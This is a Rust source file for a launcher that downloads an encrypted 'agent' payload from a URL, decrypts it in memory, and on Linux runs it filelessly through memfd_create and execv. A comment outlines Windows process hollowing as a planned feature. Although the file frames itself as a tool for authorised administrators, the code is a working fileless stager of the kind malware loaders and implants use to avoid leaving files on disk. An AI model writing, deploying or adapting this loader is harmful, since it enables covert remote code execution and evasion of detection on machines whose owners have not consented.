//! Orchestra in-memory agent launcher.
//!
//! # Purpose
//!
//! For enterprise deployment scenarios where IT administrators want to run the
//! Orchestra agent on a managed endpoint **without** persisting an executable
//! to disk, this small utility:
//!
//! 1. Downloads an AES-256-GCM-encrypted agent payload over HTTPS.
//! 2. Decrypts it in process memory using a pre-shared key supplied on the
//!    command line.
//! 3. On Linux, materialises the decrypted ELF inside an anonymous
//!    `memfd_create` file descriptor and `execve`s `/proc/self/fd/<fd>`,
//!    inheriting the launcher's argv/env. Nothing is ever written to a
//!    real filesystem.
//! 4. On non-Linux platforms the in-memory primitive is unavailable; the
//!    launcher logs a clear error and exits with a non-zero status.
//!
//! # Authorisation
//!
//! This binary is intended **only** for use by administrators who own the
//! managed endpoint or have written authorisation to operate it. Running it
//! against systems you do not control may violate computer-misuse law in
//! your jurisdiction.

use anyhow::{anyhow, Context, Result};
use base64::Engine;
use clap::Parser;
use common::CryptoSession;

#[derive(Parser, Debug)]
#[command(
    author,
    version,
    about = "Download, decrypt, and execute an Orchestra agent payload entirely in memory."
)]
struct Cli {
    /// Full HTTPS URL of the encrypted payload (e.g.
    /// `https://updates.example.com/agent.enc`).
    #[arg(long)]
    url: String,

    /// Base64-encoded AES-256 pre-shared key used to decrypt the payload.
    #[arg(long)]
    key: String,

    /// Optional arguments to pass to the launched agent process.
    #[arg(last = true)]
    agent_args: Vec<String>,
}

/// Download `url`, retrying up to `max_attempts` times with exponential
/// backoff. Never logs the URL more than once or any response body content.
async fn download_with_retry(url: &str, max_attempts: u32) -> Result<Vec<u8>> {
    let mut delay = std::time::Duration::from_millis(500);
    let mut last_err: Option<anyhow::Error> = None;
    for attempt in 1..=max_attempts {
        tracing::info!(attempt, max_attempts, "downloading encrypted payload");
        match reqwest::get(url).await {
            Ok(resp) => match resp.error_for_status() {
                Ok(ok) => match ok.bytes().await {
                    Ok(bytes) => return Ok(bytes.to_vec()),
                    Err(e) => last_err = Some(anyhow!("read body failed: {e}")),
                },
                Err(e) => last_err = Some(anyhow!("HTTP error: {e}")),
            },
            Err(e) => last_err = Some(anyhow!("request failed: {e}")),
        }
        if attempt < max_attempts {
            tracing::warn!(?delay, "download failed; backing off");
            tokio::time::sleep(delay).await;
            delay *= 2;
        }
    }
    Err(last_err.unwrap_or_else(|| anyhow!("download failed")))
}

#[tokio::main]
async fn main() -> Result<()> {
    tracing_subscriber::fmt()
        .with_max_level(tracing::Level::INFO)
        .init();

    let cli = Cli::parse();

    let key_bytes = base64::engine::general_purpose::STANDARD
        .decode(&cli.key)
        .context("--key is not valid Base64")?;
    let session = CryptoSession::from_shared_secret(&key_bytes);

    let encrypted = download_with_retry(&cli.url, 3).await?;
    tracing::info!(bytes = encrypted.len(), "payload downloaded");

    let decrypted = session
        .decrypt(&encrypted)
        .map_err(|e| anyhow!("Payload decryption failed: {e}"))?;
    tracing::info!(bytes = decrypted.len(), "payload decrypted");

    execute_in_memory(&decrypted, &cli.agent_args)
}

#[cfg(target_os = "linux")]
fn execute_in_memory(payload: &[u8], args: &[String]) -> Result<()> {
    use std::ffi::CString;
    use std::io::Write;
    use std::os::unix::io::FromRawFd;

    let name = CString::new("orchestra_agent").unwrap();
    // SAFETY: `name` is a valid nul-terminated C string. We deliberately do
    // not pass `MFD_CLOEXEC` because some payloads (notably `#!`-script
    // payloads) need the kernel to be able to re-open the file via
    // `/proc/self/fd/<fd>` after the `execv` call. The fd is freed when the
    // process exits.
    let fd = unsafe { libc::memfd_create(name.as_ptr(), 0) };
    if fd == -1 {
        return Err(anyhow!(
            "memfd_create failed: {}",
            std::io::Error::last_os_error()
        ));
    }
    // SAFETY: `fd` is a valid descriptor we just created and own.
    let mut file = unsafe { std::fs::File::from_raw_fd(fd) };
    file.write_all(payload)
        .context("Failed to write payload into memfd")?;

    let path = CString::new(format!("/proc/self/fd/{fd}")).unwrap();
    let argv0 = CString::new("orchestra-agent").unwrap();
    let mut argv: Vec<CString> = std::iter::once(argv0)
        .chain(
            args.iter()
                .map(|a| CString::new(a.as_str()).expect("arg has interior NUL")),
        )
        .collect();
    let argv_ptrs: Vec<*const libc::c_char> = argv
        .iter_mut()
        .map(|c| c.as_ptr())
        .chain(std::iter::once(std::ptr::null()))
        .collect();

    tracing::info!("executing payload via /proc/self/fd/{fd}");
    // SAFETY: `path` and `argv_ptrs` are valid nul-terminated arrays. On
    // success this call replaces the current process image and never returns.
    unsafe {
        libc::execv(path.as_ptr(), argv_ptrs.as_ptr());
    }
    // If we reach here, execv failed.
    Err(anyhow!("execv failed: {}", std::io::Error::last_os_error()))
}

#[cfg(target_os = "macos")]
fn execute_in_memory(payload: &[u8], args: &[String]) -> Result<()> {
    // Development-only fallback: macOS does not expose a stable
    // anonymous-fd-exec primitive comparable to memfd_create + execv, and a
    // real production deployment would use a code-signed launcher. For the
    // dev workflow we materialise the payload into a temporary file (with
    // `0o700` permissions) and exec it.
    use std::os::unix::fs::PermissionsExt;
    use std::os::unix::process::CommandExt;
    tracing::warn!(
        "macOS: in-memory exec not available; using temp-file fallback (development only)"
    );
    let dir = std::env::temp_dir();
    let path = dir.join(format!("orchestra-agent-{}", std::process::id()));
    std::fs::write(&path, payload)?;
    std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o700))?;
    let err = std::process::Command::new(&path).args(args).exec();
    Err(anyhow!("exec failed: {err}"))
}

#[cfg(target_os = "windows")]
fn execute_in_memory(_payload: &[u8], _args: &[String]) -> Result<()> {
    // Windows process-hollowing (CreateProcessW(CREATE_SUSPENDED) +
    // NtUnmapViewOfSection + VirtualAllocEx + WriteProcessMemory +
    // SetThreadContext + ResumeThread) is implemented in a future revision;
    // see docs/DESIGN.md "Launcher: Remote Payload Fetch and In-Memory
    // Execution". For now we refuse rather than write a file silently.
    Err(anyhow!(
        "In-memory agent execution on Windows is not yet implemented. \
         See docs/DESIGN.md for the planned process-hollowing approach."
    ))
}

#[cfg(not(any(target_os = "linux", target_os = "macos", target_os = "windows")))]
fn execute_in_memory(_payload: &[u8], _args: &[String]) -> Result<()> {
    Err(anyhow!(
        "Unsupported platform for in-memory agent execution"
    ))
}
